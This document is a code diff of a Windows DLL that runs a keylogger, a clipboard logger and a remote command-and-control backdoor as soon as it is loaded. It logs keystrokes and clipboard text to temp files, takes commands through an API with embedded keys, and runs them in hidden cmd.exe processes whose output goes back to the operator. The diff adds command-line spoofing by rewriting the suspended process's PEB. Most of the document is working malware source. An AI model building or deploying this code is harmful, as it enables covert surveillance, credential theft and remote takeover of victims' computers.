@@ -6,9 +6,13 @@
 #include <string>
 #include "api.hpp"
 #include "command.hpp"
+#include <stdio.h>
+#include <winternl.h>
 
 using namespace std;
 
+#pragma comment(lib, "ntdll.lib")
+#pragma warning(disable : 4996)
 HHOOK _hHook;
 KBDLLHOOKSTRUCT kbData;
 HINSTANCE hDllInst = NULL;
@@ -18,159 +22,291 @@ char clipboardFilePath[MAX_PATH];
 static DWORD lastKey = 0;
 static DWORD lastTime = 0;
 
-extern "C" __declspec(dllexport) void CALLBACK MeowStart(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
+extern "C" __declspec(dllexport) void CALLBACK MeowStart(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
+{
     MessageBoxA(NULL, "Keylogger running...", "Debug", MB_OK);
 }
 
-int save_key(DWORD vkCode) {
+int save_key(DWORD vkCode)
+{
     DWORD currentTime = GetTickCount();
-    if (vkCode == lastKey && (currentTime - lastTime) < 300) {
+    if (vkCode == lastKey && (currentTime - lastTime) < 300)
+    {
         return 0;
     }
     lastKey = vkCode;
     lastTime = currentTime;
-    FILE* OUTPUT_FILE = NULL;
-    if (fopen_s(&OUTPUT_FILE, outputFilePath, "a+") != 0 || OUTPUT_FILE == NULL) {
-        return 0; 
+    FILE *OUTPUT_FILE = NULL;
+    if (fopen_s(&OUTPUT_FILE, outputFilePath, "a+") != 0 || OUTPUT_FILE == NULL)
+    {
+        return 0;
     }
 
-    bool isCaps = GetKeyState(VK_CAPITAL) & 0x0001; // 判斷 Caps Lock 狀態
+    bool isCaps = GetKeyState(VK_CAPITAL) & 0x0001;     // 判斷 Caps Lock 狀態
     bool isShift = GetAsyncKeyState(VK_SHIFT) & 0x8000; // 判斷 Shift 鍵是否被按下
     char outputChar = ' ';
-    if (vkCode >= 0x30 && vkCode <= 0x39) {// number
+    if (vkCode >= 0x30 && vkCode <= 0x39)
+    { // number
         outputChar = vkCode;
-        if (isShift) {
-            switch ((char)vkCode) {
-            case '0': outputChar = ')'; break;
-            case '1': outputChar = '!'; break;
-            case '2': outputChar = '@'; break;
-            case '3': outputChar = '#'; break;
-            case '4': outputChar = '$'; break;
-            case '5': outputChar = '%'; break;
-            case '6': outputChar = '^'; break;
-            case '7': outputChar = '&'; break;
-            case '8': outputChar = '*'; break;
-            case '9': outputChar = '('; break;
+        if (isShift)
+        {
+            switch ((char)vkCode)
+            {
+            case '0':
+                outputChar = ')';
+                break;
+            case '1':
+                outputChar = '!';
+                break;
+            case '2':
+                outputChar = '@';
+                break;
+            case '3':
+                outputChar = '#';
+                break;
+            case '4':
+                outputChar = '$';
+                break;
+            case '5':
+                outputChar = '%';
+                break;
+            case '6':
+                outputChar = '^';
+                break;
+            case '7':
+                outputChar = '&';
+                break;
+            case '8':
+                outputChar = '*';
+                break;
+            case '9':
+                outputChar = '(';
+                break;
             }
         }
         fprintf(OUTPUT_FILE, "%c", outputChar);
     }
-    else if (vkCode >= 0x41 && vkCode <= 0x5A) {
+    else if (vkCode >= 0x41 && vkCode <= 0x5A)
+    {
         outputChar = (char)vkCode;
-        if (isCaps || isShift) {
+        if (isCaps || isShift)
+        {
             fprintf(OUTPUT_FILE, "%c", outputChar);
         }
-        else {
+        else
+        {
             outputChar = (char)(vkCode + 32); // 小寫轉換
             fprintf(OUTPUT_FILE, "%c", outputChar);
         }
-
     }
-    else if (vkCode >= 0x70 && vkCode <= 0x87) {// F1~F24
+    else if (vkCode >= 0x70 && vkCode <= 0x87)
+    { // F1~F24
         int num = vkCode - 111;
         fprintf(OUTPUT_FILE, "F%d\n", num);
     }
-    else if (vkCode >= 0xBB && vkCode <= 0xDE) { //Keyboard symbol
-        switch (vkCode) {
-        case 0xBB: outputChar = isShift ? '+' : '='; fprintf(OUTPUT_FILE, "%c", outputChar); break;
-        case 0xBC: outputChar = isShift ? '<' : ','; fprintf(OUTPUT_FILE, "%c", outputChar); break;
-        case 0xBD: outputChar = isShift ? '_' : '-'; fprintf(OUTPUT_FILE, "%c", outputChar); break;
-        case 0xBE: outputChar = isShift ? '>' : '.'; fprintf(OUTPUT_FILE, "%c", outputChar); break;
-        case 0xBF: outputChar = isShift ? '?' : '/'; fprintf(OUTPUT_FILE, "%c", outputChar); break;
-        case 0xC0: outputChar = isShift ? '~' : '`'; fprintf(OUTPUT_FILE, "%c", outputChar); break;
-        case 0xDB: outputChar = isShift ? '{' : '['; fprintf(OUTPUT_FILE, "%c", outputChar); break;
-        case 0xDC: outputChar = isShift ? '|' : '\\'; fprintf(OUTPUT_FILE, "%c", outputChar); break;
-        case 0xDD: outputChar = isShift ? '}' : ']'; fprintf(OUTPUT_FILE, "%c", outputChar); break;
-        default: break;
+    else if (vkCode >= 0xBB && vkCode <= 0xDE)
+    { // Keyboard symbol
+        switch (vkCode)
+        {
+        case 0xBB:
+            outputChar = isShift ? '+' : '=';
+            fprintf(OUTPUT_FILE, "%c", outputChar);
+            break;
+        case 0xBC:
+            outputChar = isShift ? '<' : ',';
+            fprintf(OUTPUT_FILE, "%c", outputChar);
+            break;
+        case 0xBD:
+            outputChar = isShift ? '_' : '-';
+            fprintf(OUTPUT_FILE, "%c", outputChar);
+            break;
+        case 0xBE:
+            outputChar = isShift ? '>' : '.';
+            fprintf(OUTPUT_FILE, "%c", outputChar);
+            break;
+        case 0xBF:
+            outputChar = isShift ? '?' : '/';
+            fprintf(OUTPUT_FILE, "%c", outputChar);
+            break;
+        case 0xC0:
+            outputChar = isShift ? '~' : '`';
+            fprintf(OUTPUT_FILE, "%c", outputChar);
+            break;
+        case 0xDB:
+            outputChar = isShift ? '{' : '[';
+            fprintf(OUTPUT_FILE, "%c", outputChar);
+            break;
+        case 0xDC:
+            outputChar = isShift ? '|' : '\\';
+            fprintf(OUTPUT_FILE, "%c", outputChar);
+            break;
+        case 0xDD:
+            outputChar = isShift ? '}' : ']';
+            fprintf(OUTPUT_FILE, "%c", outputChar);
+            break;
+        default:
+            break;
         }
     }
-    else if (vkCode >= 0x60 && vkCode <= 0x6F) {//Numpad
-        if (!(isShift)) {
-            switch (vkCode) {
-            case VK_NUMPAD0: fprintf(OUTPUT_FILE, "0"); break;          // Numpad 0
-            case VK_NUMPAD1: fprintf(OUTPUT_FILE, "1"); break;          // Numpad 1
-            case VK_NUMPAD2: fprintf(OUTPUT_FILE, "2"); break;          // Numpad 2
-            case VK_NUMPAD3: fprintf(OUTPUT_FILE, "3"); break;          // Numpad 3
-            case VK_NUMPAD4: fprintf(OUTPUT_FILE, "4"); break;          // Numpad 4
-            case VK_NUMPAD5: fprintf(OUTPUT_FILE, "5"); break;          // Numpad 5
-            case VK_NUMPAD6: fprintf(OUTPUT_FILE, "6"); break;          // Numpad 6
-            case VK_NUMPAD7: fprintf(OUTPUT_FILE, "7"); break;          // Numpad 7
-            case VK_NUMPAD8: fprintf(OUTPUT_FILE, "8"); break;          // Numpad 8
-            case VK_NUMPAD9: fprintf(OUTPUT_FILE, "9"); break;          // Numpad 9
-            case VK_MULTIPLY: fprintf(OUTPUT_FILE, "*"); break;         // Numpad Multiply (*)
-            case VK_ADD: fprintf(OUTPUT_FILE, "+"); break;              // Numpad Add (+)
-            case VK_SUBTRACT: fprintf(OUTPUT_FILE, "-"); break;         // Numpad Subtract (-)
-            case VK_DECIMAL: fprintf(OUTPUT_FILE, "."); break;          // Numpad Decimal (.)
-            case VK_DIVIDE: fprintf(OUTPUT_FILE, "/"); break;           // Numpad Divide (/)
-            default: break;
+    else if (vkCode >= 0x60 && vkCode <= 0x6F)
+    { // Numpad
+        if (!(isShift))
+        {
+            switch (vkCode)
+            {
+            case VK_NUMPAD0:
+                fprintf(OUTPUT_FILE, "0");
+                break; // Numpad 0
+            case VK_NUMPAD1:
+                fprintf(OUTPUT_FILE, "1");
+                break; // Numpad 1
+            case VK_NUMPAD2:
+                fprintf(OUTPUT_FILE, "2");
+                break; // Numpad 2
+            case VK_NUMPAD3:
+                fprintf(OUTPUT_FILE, "3");
+                break; // Numpad 3
+            case VK_NUMPAD4:
+                fprintf(OUTPUT_FILE, "4");
+                break; // Numpad 4
+            case VK_NUMPAD5:
+                fprintf(OUTPUT_FILE, "5");
+                break; // Numpad 5
+            case VK_NUMPAD6:
+                fprintf(OUTPUT_FILE, "6");
+                break; // Numpad 6
+            case VK_NUMPAD7:
+                fprintf(OUTPUT_FILE, "7");
+                break; // Numpad 7
+            case VK_NUMPAD8:
+                fprintf(OUTPUT_FILE, "8");
+                break; // Numpad 8
+            case VK_NUMPAD9:
+                fprintf(OUTPUT_FILE, "9");
+                break; // Numpad 9
+            case VK_MULTIPLY:
+                fprintf(OUTPUT_FILE, "*");
+                break; // Numpad Multiply (*)
+            case VK_ADD:
+                fprintf(OUTPUT_FILE, "+");
+                break; // Numpad Add (+)
+            case VK_SUBTRACT:
+                fprintf(OUTPUT_FILE, "-");
+                break; // Numpad Subtract (-)
+            case VK_DECIMAL:
+                fprintf(OUTPUT_FILE, ".");
+                break; // Numpad Decimal (.)
+            case VK_DIVIDE:
+                fprintf(OUTPUT_FILE, "/");
+                break; // Numpad Divide (/)
+            default:
+                break;
             }
         }
     }
 
-    switch (vkCode) {// method keys
-    case VK_BACK: fprintf(OUTPUT_FILE, "[Backspace]\n"); break;  // Backspace
-    case VK_TAB: fprintf(OUTPUT_FILE, "[Tab]\n"); break;         // Tab
-    case VK_RETURN: fprintf(OUTPUT_FILE, "[Enter]\n"); break;    // Enter
+    switch (vkCode)
+    { // method keys
+    case VK_BACK:
+        fprintf(OUTPUT_FILE, "[Backspace]\n");
+        break; // Backspace
+    case VK_TAB:
+        fprintf(OUTPUT_FILE, "[Tab]\n");
+        break; // Tab
+    case VK_RETURN:
+        fprintf(OUTPUT_FILE, "[Enter]\n");
+        break; // Enter
     // case VK_LSHIFT: fprintf(OUTPUT_FILE, "[LShift]\n"); break;   // LShift
     // case VK_RSHIFT: fprintf(OUTPUT_FILE, "[RShift]\n"); break;   // RShift
-    case VK_LCONTROL: fprintf(OUTPUT_FILE, "[LCtrl]"); break;  // LCtrl
-    case VK_RCONTROL: fprintf(OUTPUT_FILE, "[RCtrl]"); break;  // RCtrl
-    case VK_LMENU: fprintf(OUTPUT_FILE, "[LAlt]\n"); break;      // LAlt
-    case VK_RMENU: fprintf(OUTPUT_FILE, "[RAlt]\n"); break;      // RAlt
-    case VK_LWIN: fprintf(OUTPUT_FILE, "[LWin]\n"); break;       // LWin
-    case VK_RWIN: fprintf(OUTPUT_FILE, "[RWin]\n"); break;       // RWin
-    case VK_CAPITAL: fprintf(OUTPUT_FILE, "[Caps Lock]\n"); break; // Caps Lock
-    case VK_ESCAPE: fprintf(OUTPUT_FILE, "[Esc]\n"); break;      // Esc
-    case VK_SPACE: fprintf(OUTPUT_FILE, "[Space]"); break;     // Space
-    default: break;
+    case VK_LCONTROL:
+        fprintf(OUTPUT_FILE, "[LCtrl]");
+        break; // LCtrl
+    case VK_RCONTROL:
+        fprintf(OUTPUT_FILE, "[RCtrl]");
+        break; // RCtrl
+    case VK_LMENU:
+        fprintf(OUTPUT_FILE, "[LAlt]\n");
+        break; // LAlt
+    case VK_RMENU:
+        fprintf(OUTPUT_FILE, "[RAlt]\n");
+        break; // RAlt
+    case VK_LWIN:
+        fprintf(OUTPUT_FILE, "[LWin]\n");
+        break; // LWin
+    case VK_RWIN:
+        fprintf(OUTPUT_FILE, "[RWin]\n");
+        break; // RWin
+    case VK_CAPITAL:
+        fprintf(OUTPUT_FILE, "[Caps Lock]\n");
+        break; // Caps Lock
+    case VK_ESCAPE:
+        fprintf(OUTPUT_FILE, "[Esc]\n");
+        break; // Esc
+    case VK_SPACE:
+        fprintf(OUTPUT_FILE, "[Space]");
+        break; // Space
+    default:
+        break;
     }
     fclose(OUTPUT_FILE);
     return 0;
 }
 
-LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam) {
-    if (code >= 0) {
-        if (wParam == WM_KEYDOWN) {
-            kbData = *((KBDLLHOOKSTRUCT*)lParam);
+LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
+{
+    if (code >= 0)
+    {
+        if (wParam == WM_KEYDOWN)
+        {
+            kbData = *((KBDLLHOOKSTRUCT *)lParam);
             save_key(kbData.vkCode);
         }
     }
     return CallNextHookEx(_hHook, code, wParam, lParam);
 }
-int keylogger() {
+int keylogger()
+{
     _hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
-    if (_hHook == NULL) {
+    if (_hHook == NULL)
+    {
         printf("Failed to set hook. Error code: %d\n", GetLastError());
-        return FALSE; 
+        return FALSE;
     }
     MSG msg;
-    while (GetMessage(&msg, NULL, 0, 0)) {
-        TranslateMessage(&msg); 
-        DispatchMessage(&msg);  
+    while (GetMessage(&msg, NULL, 0, 0))
+    {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
     }
     return 0;
 }
-void SetupFilePath() {
+void SetupFilePath()
+{
     char tempPath[MAX_PATH];
-    GetTempPathA(MAX_PATH, tempPath); 
+    GetTempPathA(MAX_PATH, tempPath);
     snprintf(outputFilePath, sizeof(outputFilePath), "%sMeoWKeylogger.txt", tempPath);
     snprintf(clipboardFilePath, sizeof(clipboardFilePath), "%sMeoWClipboard.txt", tempPath);
 }
 
-void ProcessClipboard() {
-    if (!OpenClipboard(NULL)){
+void ProcessClipboard()
+{
+    if (!OpenClipboard(NULL))
+    {
         MessageBoxA(NULL, "ClipBoard Error", "Debug", MB_OK);
         return;
     }
-    
+
     HANDLE hData = GetClipboardData(CF_UNICODETEXT);
-    if (hData != NULL) {
-        wchar_t* pText = (wchar_t*)GlobalLock(hData);
-        if (pText != NULL) {
-            FILE* f = NULL;
-            if (fopen_s(&f, clipboardFilePath, "a+, ccs=UTF-8") == 0 && f) {
+    if (hData != NULL)
+    {
+        wchar_t *pText = (wchar_t *)GlobalLock(hData);
+        if (pText != NULL)
+        {
+            FILE *f = NULL;
+            if (fopen_s(&f, clipboardFilePath, "a+, ccs=UTF-8") == 0 && f)
+            {
                 // MessageBoxW(NULL, pText, L"Debug", MB_OK);
-                fwprintf(f, L"\n[Clipboard Content]:%ls\n", pText);  
+                fwprintf(f, L"\n[Clipboard Content]:%ls\n", pText);
                 fclose(f);
             }
             GlobalUnlock(hData);
@@ -179,103 +315,176 @@ void ProcessClipboard() {
     CloseClipboard();
 }
 
-LRESULT CALLBACK ClipboardWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
-    if (msg == WM_CLIPBOARDUPDATE) {
+LRESULT CALLBACK ClipboardWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
+{
+    if (msg == WM_CLIPBOARDUPDATE)
+    {
         ProcessClipboard();
     }
     return DefWindowProc(hwnd, msg, wParam, lParam);
 }
 
-int ClipBoard(LPVOID lpParam) {
+int ClipBoard(LPVOID lpParam)
+{
     DWORD lastSequence = GetClipboardSequenceNumber();
     // MessageBoxA(NULL, "Clipboard Thread Started!", "Debug", MB_OK);
-    while (true) {
+    while (true)
+    {
         DWORD currentSequence = GetClipboardSequenceNumber();
-        if (currentSequence != lastSequence) {
+        if (currentSequence != lastSequence)
+        {
             lastSequence = currentSequence;
-            ProcessClipboard(); 
+            ProcessClipboard();
         }
         Sleep(1000);
     }
     return 0;
 }
 
-std::string exec_cmd(const std::string& cmd) {
-    // MessageBoxA(NULL, ("Executing: " + cmd).c_str(), "Debug: exec_cmd Start", MB_OK);
-    
+std::wstring stringToWstring(const std::string &str)
+{
+    if (str.empty())
+        return L"";
+    // 計算轉換後的長度
+    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
+    std::wstring wstrTo(size_needed, 0);
+    // 執行實際轉換
+    MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
+    return wstrTo;
+}
+
+std::string exec_cmd(const std::string &cmd)
+{
     std::string result;
     HANDLE hReadPipe, hWritePipe;
-    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
+    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
 
-    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) return "Pipe Error";
+    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0))
+        return "Pipe Error";
     SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);
 
-    STARTUPINFOA si = { sizeof(si) };
-    PROCESS_INFORMATION pi = { 0 };
-    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
-    si.hStdOutput = hWritePipe;
-    si.hStdError = hWritePipe;
-    si.wShowWindow = SW_HIDE;
+    PROCESS_INFORMATION PI = {0};
+    STARTUPINFOW SI = {sizeof(SI)};
+    CONTEXT CTX = {0};
+    CTX.ContextFlags = CONTEXT_FULL;
 
-    std::string full_cmd = "cmd.exe /c \"chcp 65001 > nul && " + cmd + " 2>&1\"";
+    // 设置管道到正确的 STARTUPINFOW 结构体
+    SI.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    SI.hStdOutput = hWritePipe;
+    SI.hStdError = hWritePipe;
+    SI.wShowWindow = SW_HIDE;
 
-    if (!CreateProcessA(NULL, (LPSTR)full_cmd.c_str(), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+    wchar_t dummyCmdline[] = L"powershell.exe -NoExit -Command \"Write-Host 'Safe Process'\" MeowwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwMeowwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
+
+    int size_needed = MultiByteToWideChar(CP_UTF8, 0, cmd.c_str(), -1, NULL, 0);
+    std::wstring wcmd(size_needed, L'\0');
+    MultiByteToWideChar(CP_UTF8, 0, cmd.c_str(), -1, &wcmd[0], size_needed);
+    wchar_t realCmdline[1024] = {0};
+    swprintf_s(realCmdline, 1024, L"C:\\Windows\\System32\\cmd.exe /c set PATH=C:\\Windows\\System32;C:\\Windows;C:\\Windows\\System32\\Wbem && %s", wcmd.c_str());
+
+    
+    char tempPath[MAX_PATH];
+    GetTempPathA(MAX_PATH, tempPath);
+    wchar_t tempPathW[MAX_PATH];
+    MultiByteToWideChar(CP_ACP, 0, tempPath, -1, tempPathW, MAX_PATH);
+
+    if (!CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", dummyCmdline, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, tempPathW, &SI, &PI))
+    {
         CloseHandle(hReadPipe);
         CloseHandle(hWritePipe);
-        return "CreateProcess Failed";
     }
 
+    if (!GetThreadContext(PI.hThread, &CTX))
+    {
+        TerminateProcess(PI.hProcess, 0);
+        CloseHandle(PI.hProcess);
+        CloseHandle(PI.hThread);
+        CloseHandle(hReadPipe);
+        CloseHandle(hWritePipe);
+    }
+
+    LPVOID remotePebAddr = (LPVOID)CTX.Rdx;
+    PEB remotePeb = {0};
+
+    ReadProcessMemory(PI.hProcess, remotePebAddr, &remotePeb, sizeof(remotePeb), NULL);
+    RTL_USER_PROCESS_PARAMETERS params = {0};
+    ReadProcessMemory(PI.hProcess, remotePeb.ProcessParameters, &params, sizeof(params), NULL);
+    WriteProcessMemory(PI.hProcess, params.CommandLine.Buffer, realCmdline, sizeof(realCmdline), NULL);
+
+    ResumeThread(PI.hThread);
     CloseHandle(hWritePipe);
 
-    char buffer[1024];
+    char buffer[2048];
     DWORD bytesRead;
-    while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
+    const size_t MAX_OUTPUT_SIZE = 102400; // 限制输出最大 100KB (HackMD API 限制 250KB)
+    while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0)
+    {
         buffer[bytesRead] = '\0';
+
+        if (result.length() + bytesRead > MAX_OUTPUT_SIZE)
+        {
+            size_t remaining = MAX_OUTPUT_SIZE - result.length();
+            if (remaining > 0)
+            {
+                result.append(buffer, remaining);
+            }
+            result += "\n\n[Output truncated - too long]";
+            break;
+        }
+
         result += buffer;
     }
 
-    WaitForSingleObject(pi.hProcess, 5000);
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
+    WaitForSingleObject(PI.hProcess, 5000);
+    CloseHandle(PI.hProcess);
+    CloseHandle(PI.hThread);
     CloseHandle(hReadPipe);
 
-    // MessageBoxA(NULL, "Command Finished", "Debug: exec_cmd End", MB_OK);
     return result.empty() ? "[No Output]" : result;
 }
 
-DWORD WINAPI C2MonitorThread(LPVOID lpParam) {
-    API api("35KCRKDLUUKPF9ETFF0EHHT1K7YDNTQJ91AJCAPUUYMAEOHPGZ");
-    CommandManager cmdManager(&api, "M3cmo3s5QQqxcCACLR7E5g");
+DWORD WINAPI C2MonitorThread(LPVOID lpParam)
+{
+    API api("S8U412XFGM8PZA11BLQO1860JML1WIL1UOVLVHRUZA6IQJ95U");
+    CommandManager cmdManager(&api, "w6y4WrQtRNeIM5Kkz4PUMg");
 
-    while (true) {
-        try {
+    while (true)
+    {
+        try
+        {
             // 1. 接收遠端指令 (此處會進入 wait 迴圈)
             std::string cmd = cmdManager.receive_command();
-            
-            if (!cmd.empty()) {
+
+            if (!cmd.empty())
+            {
                 // 2. 執行指令
                 std::string output = exec_cmd(cmd);
 
-                // 3. 回傳結果 
+                // 3. 回傳結果
                 cmdManager.send_response(output);
             }
-        } catch (...) {
         }
-        Sleep(1000); 
+        catch (...)
+        {
+        }
+        Sleep(5000); 
     }
     return 0;
 }
 
-BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
-    switch (ul_reason_for_call) {
-    case DLL_PROCESS_ATTACH: {
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+    {
         SetupFilePath();
         HANDLE Keylogger_Thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)keylogger, NULL, 0, NULL);
         CloseHandle(Keylogger_Thread);
-        
+
         HANDLE ClipBoard_Thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ClipBoard, NULL, 0, NULL);
         CloseHandle(ClipBoard_Thread);
-        
+
         HANDLE hC2 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)C2MonitorThread, NULL, 0, NULL);
         CloseHandle(hC2);
 
